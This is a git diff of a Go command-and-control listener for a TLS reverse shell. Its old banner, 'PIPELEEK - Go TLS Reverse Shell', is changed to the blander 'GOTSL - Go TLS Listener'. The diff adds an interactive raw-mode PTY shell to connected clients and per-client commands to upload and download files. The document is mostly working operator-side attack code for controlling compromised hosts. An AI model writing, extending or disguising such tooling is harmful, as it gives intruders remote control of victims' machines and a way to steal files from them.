@@ -3,10 +3,13 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
+	"io"
 	"log"
 	"os"
 	"strings"
+	"syscall"
 	"time"
+	"unsafe"
 
 	"github.com/peterh/liner"
 
@@ -19,14 +22,14 @@ import (
 
 func printHeader() {
 	fmt.Println()
-	fmt.Println("  ██████╗  ██████╗ ████████╗███████╗")
-	fmt.Println("  ██╔════╝ ██╔═══██╗╚══██╔══╝██╔════╝")
-	fmt.Println("  ██║  ███╗██║   ██║   ██║   ███████╗")
-	fmt.Println("  ██║   ██║██║   ██║   ██║   ╚════██║")
-	fmt.Println("  ╚██████╔╝╚██████╔╝   ██║   ███████║")
-	fmt.Println("   ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝")
+	fmt.Println(` ██████╗  ██████╗ ████████╗ ██████╗  ██╗      `)
+	fmt.Println(`██╔════╝ ██╔═══██╗╚══██╔══╝██╔════╝ ██║      `)
+	fmt.Println(`██║  ███╗██║   ██║   ██║   ██████╗  ██║      `)
+	fmt.Println(`██║   ██║██║   ██║   ██║   ██╔══██╗ ██║      `)
+	fmt.Println(`╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝███████╗ `)
+	fmt.Println(` ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝ `)
 	fmt.Println()
-	fmt.Println("  PIPELEEK - Go TLS Reverse Shell")
+	fmt.Println("  GOTSL - Go TLS Listener")
 	fmt.Println()
 }
 
@@ -85,15 +88,10 @@ func interactiveShell(l *server.Listener) {
 	line.SetCtrlCAborts(true)
 	defer line.Close()
 
-	var currentClient string
-
 	printHelp()
 
 	for {
 		prompt := "listener> "
-		if currentClient != "" {
-			prompt = fmt.Sprintf("shell[%s]> ", currentClient)
-		}
 
 		input, err := line.Prompt(prompt)
 		if err != nil {
@@ -113,53 +111,58 @@ func interactiveShell(l *server.Listener) {
 		parts := strings.Fields(input)
 		command := parts[0]
 
-		if currentClient == "" {
-			switch command {
-			case "ls", "dir":
-				listClients(l)
-			case "use":
-				currentClient = useClient(l, parts)
-			case "exit":
-				return
-			default:
-				fmt.Printf("Unknown command: %s\n", command)
-			}
-		} else {
-			if input == "bg" {
-				fmt.Printf("Backgrounding session with %s\n", currentClient)
-				currentClient = ""
+		switch command {
+		case "ls", "dir":
+			listClients(l)
+		case "shell":
+			if len(parts) < 2 {
+				fmt.Println("Usage: shell <client_id>")
 				continue
 			}
-
-			if strings.HasPrefix(input, "upload ") {
-				if !handleUpload(l, currentClient, parts) {
-					currentClient = ""
-				}
+			clientAddr := getClientByID(l, parts[1])
+			if clientAddr == "" {
 				continue
 			}
-
-			if strings.HasPrefix(input, "download ") {
-				if !handleDownload(l, currentClient, parts) {
-					currentClient = ""
-				}
+			enterPtyShell(l, clientAddr)
+		case "upload":
+			if len(parts) != 4 {
+				fmt.Println("Usage: upload <client_id> <local_path> <remote_path>")
 				continue
 			}
-
-			if !sendShellCommand(l, currentClient, input) {
-				currentClient = ""
+			clientAddr := getClientByID(l, parts[1])
+			if clientAddr == "" {
+				continue
 			}
+			handleUploadGlobal(l, clientAddr, parts[2], parts[3])
+		case "download":
+			if len(parts) != 4 {
+				fmt.Println("Usage: download <client_id> <remote_path> <local_path>")
+				continue
+			}
+			clientAddr := getClientByID(l, parts[1])
+			if clientAddr == "" {
+				continue
+			}
+			handleDownloadGlobal(l, clientAddr, parts[2], parts[3])
+		case "exit":
+			return
+		default:
+			fmt.Printf("Unknown command: %s (type 'help' or see available commands above)\n", command)
 		}
 	}
 }
 
 func printHelp() {
 	fmt.Println("\nCommands:")
-	fmt.Println("  ls                   - List connected clients")
-	fmt.Println("  use <client_id>      - Interact with a specific client")
-	fmt.Println("  upload <l> <r>       - Upload local file <l> to remote path <r> (active session)")
-	fmt.Println("  download <r> <l>     - Download remote file <r> to local path <l> (active session)")
-	fmt.Println("  bg                   - Return to listener prompt from a session")
-	fmt.Println("  exit                 - Exit the listener")
+	fmt.Println("  ls                          - List connected clients")
+	fmt.Println("  shell <client_id>           - Open interactive PTY shell with client")
+	fmt.Println("  upload <id> <local> <remote> - Upload local file to remote path on client")
+	fmt.Println("  download <id> <remote> <local> - Download remote file from client")
+	fmt.Println("  exit                        - Exit the listener")
+	fmt.Println()
+	fmt.Println("In PTY shell mode:")
+	fmt.Println("  Ctrl-D                      - Return to listener prompt")
+	fmt.Println("  Ctrl-C                      - Send interrupt signal to remote shell")
 	fmt.Println()
 }
 
@@ -176,37 +179,23 @@ func listClients(l listenerInterface) {
 	}
 }
 
-func useClient(l listenerInterface, parts []string) string {
-	if len(parts) < 2 {
-		fmt.Println("Usage: use <client_id>")
-		return ""
-	}
-
+func getClientByID(l listenerInterface, idStr string) string {
 	var numIdx int
-	if _, err := fmt.Sscanf(parts[1], "%d", &numIdx); err != nil {
-		fmt.Printf("Invalid client ID: %s\n", parts[1])
+	if _, err := fmt.Sscanf(idStr, "%d", &numIdx); err != nil {
+		fmt.Printf("Invalid client ID: %s\n", idStr)
 		return ""
 	}
 
 	clients := l.GetClients()
 	if numIdx > 0 && numIdx <= len(clients) {
-		selectedClient := clients[numIdx-1]
-		fmt.Printf("Now interacting with: %s\n", selectedClient)
-		fmt.Println("Type 'bg' to return to listener prompt")
-		return selectedClient
+		return clients[numIdx-1]
 	}
 
 	fmt.Println("Client not found")
 	return ""
 }
 
-func handleUpload(l listenerInterface, currentClient string, parts []string) bool {
-	if len(parts) != 3 {
-		fmt.Println("Usage: upload <local_path> <remote_path>")
-		return true
-	}
-
-	localPath, remotePath := parts[1], parts[2]
+func handleUploadGlobal(l listenerInterface, currentClient, localPath, remotePath string) bool {
 	data, err := os.ReadFile(localPath)
 	if err != nil {
 		fmt.Printf("Error reading local file: %v\n", err)
@@ -283,20 +272,14 @@ func handleUpload(l listenerInterface, currentClient string, parts []string) boo
 	return true
 }
 
-func handleDownload(l listenerInterface, currentClient string, parts []string) bool {
-	if len(parts) != 3 {
-		fmt.Println("Usage: download <remote_path> <local_path>")
-		return true
-	}
-
-	remotePath, localPath := parts[1], parts[2]
+func handleDownloadGlobal(l listenerInterface, currentClient, remotePath, localPath string) bool {
 	cmd := fmt.Sprintf("%s %s", protocol.CmdDownload, remotePath)
 	if err := l.SendCommand(currentClient, cmd); err != nil {
 		fmt.Printf("Error sending download: %v\n", err)
 		return false
 	}
 
-	resp, err := l.GetResponse(currentClient, 5000000000)
+	resp, err := l.GetResponse(currentClient, time.Duration(protocol.DownloadTimeout))
 	if err != nil {
 		fmt.Printf("Error getting download response: %v\n", err)
 		return false
@@ -325,22 +308,135 @@ func handleDownload(l listenerInterface, currentClient string, parts []string) b
 	return true
 }
 
-func sendShellCommand(l listenerInterface, currentClient, input string) bool {
-	if err := l.SendCommand(currentClient, input); err != nil {
-		fmt.Printf("Error sending command: %v\n", err)
-		return false
+func enterPtyShell(l *server.Listener, clientAddr string) {
+	fmt.Printf("Entering PTY shell with %s...\n", clientAddr)
+	
+	// Send PTY_MODE command
+	if err := l.SendCommand(clientAddr, protocol.CmdPtyMode); err != nil {
+		fmt.Printf("Error entering PTY mode: %v\n", err)
+		return
 	}
 
-	resp, err := l.GetResponse(currentClient, 5000000000)
+	// Wait for confirmation
+	resp, err := l.GetResponse(clientAddr, 10*time.Second)
 	if err != nil {
-		fmt.Printf("Error getting response: %v\n", err)
-		return false
+		fmt.Printf("Error getting PTY mode confirmation: %v\n", err)
+		return
 	}
 
-	clean := strings.ReplaceAll(resp, protocol.EndOfOutputMarker, "")
-	fmt.Print(clean)
-	if !strings.HasSuffix(clean, "\n") {
-		fmt.Println()
+	if !strings.Contains(resp, "OK") {
+		fmt.Printf("Failed to enter PTY mode: %s\n", strings.ReplaceAll(resp, protocol.EndOfOutputMarker, ""))
+		return
 	}
-	return true
+
+	// Enter PTY mode on listener side (creates PTY data channel)
+	ptyDataChan, err := l.EnterPtyMode(clientAddr)
+	if err != nil {
+		fmt.Printf("Error creating PTY data channel: %v\n", err)
+		return
+	}
+
+	fmt.Println("PTY shell active. Press Ctrl-D to return to listener prompt.")
+	fmt.Println("Press Ctrl-C to send interrupt to remote shell.")
+
+	// Setup raw terminal mode for local terminal
+	oldState, err := setRawMode()
+	if err != nil {
+		fmt.Printf("Warning: Could not set raw mode: %v\n", err)
+		// Continue anyway
+	}
+	defer func() {
+		if oldState != nil {
+			restoreTerminal(oldState)
+		}
+	}()
+
+	// Channel to signal output goroutine to stop
+	outputDone := make(chan bool, 1)
+
+	// Forward PTY output to stdout
+	go func() {
+		for {
+			select {
+			case data, ok := <-ptyDataChan:
+				if !ok {
+					// Channel closed, exit goroutine
+					outputDone <- true
+					return
+				}
+				os.Stdout.Write(data)
+			case <-outputDone:
+				// Graceful shutdown signal
+				return
+			}
+		}
+	}()
+
+	// Read from stdin and forward to PTY
+	stdinBuf := make([]byte, 1024)
+	
+	for {
+		n, err := os.Stdin.Read(stdinBuf)
+		if err != nil {
+			if err != io.EOF {
+				fmt.Printf("\nError reading stdin: %v\n", err)
+			}
+			break
+		}
+
+		if n > 0 {
+			data := stdinBuf[:n]
+			
+			// Check for Ctrl-D (EOF)
+			if strings.Contains(string(data), "\x04") {
+				break
+			}
+
+			// Send data immediately to PTY
+			encoded, err := compression.CompressToHex(data)
+			if err != nil {
+				fmt.Printf("\nError encoding input: %v\n", err)
+				break
+			}
+			l.SendCommand(clientAddr, protocol.CmdPtyData+" "+encoded)
+		}
+	}
+
+	// Exit PTY mode
+	fmt.Println("\nExiting PTY shell...")
+	l.SendCommand(clientAddr, protocol.CmdPtyExit)
+	time.Sleep(100 * time.Millisecond) // Give it time to process
+	l.ExitPtyMode(clientAddr)
+	// Wait for output goroutine to finish
+	select {
+	case <-outputDone:
+	case <-time.After(1 * time.Second):
+	}
+}
+
+func setRawMode() (*syscall.Termios, error) {
+	// Get current terminal state
+	var oldState syscall.Termios
+	if _, _, err := syscall.Syscall(syscall.SYS_IOCTL, os.Stdin.Fd(), syscall.TCGETS, uintptr(unsafe.Pointer(&oldState))); err != 0 {
+		return nil, fmt.Errorf("failed to get terminal state: %v", err)
+	}
+
+	// Set raw mode
+	newState := oldState
+	newState.Lflag &^= syscall.ECHO | syscall.ICANON | syscall.ISIG
+	newState.Iflag &^= syscall.ICRNL | syscall.INPCK | syscall.ISTRIP | syscall.IXON
+	newState.Oflag &^= syscall.OPOST
+	newState.Cflag |= syscall.CS8
+	newState.Cc[syscall.VMIN] = 1
+	newState.Cc[syscall.VTIME] = 0
+
+	if _, _, err := syscall.Syscall(syscall.SYS_IOCTL, os.Stdin.Fd(), syscall.TCSETS, uintptr(unsafe.Pointer(&newState))); err != 0 {
+		return nil, fmt.Errorf("failed to set raw mode: %v", err)
+	}
+
+	return &oldState, nil
+}
+
+func restoreTerminal(oldState *syscall.Termios) {
+	syscall.Syscall(syscall.SYS_IOCTL, os.Stdin.Fd(), syscall.TCSETS, uintptr(unsafe.Pointer(oldState)))
 }
